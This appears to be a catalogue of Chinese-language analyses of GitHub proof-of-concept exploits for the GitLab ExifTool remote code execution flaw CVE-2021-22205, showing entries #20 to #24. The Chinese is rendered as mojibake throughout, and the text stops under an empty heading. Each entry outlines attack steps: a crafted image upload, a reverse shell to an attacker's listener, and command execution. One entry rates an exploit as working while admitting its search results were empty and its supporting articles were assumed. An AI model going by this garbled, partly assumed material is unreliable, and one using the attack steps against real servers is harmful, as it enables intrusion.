æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

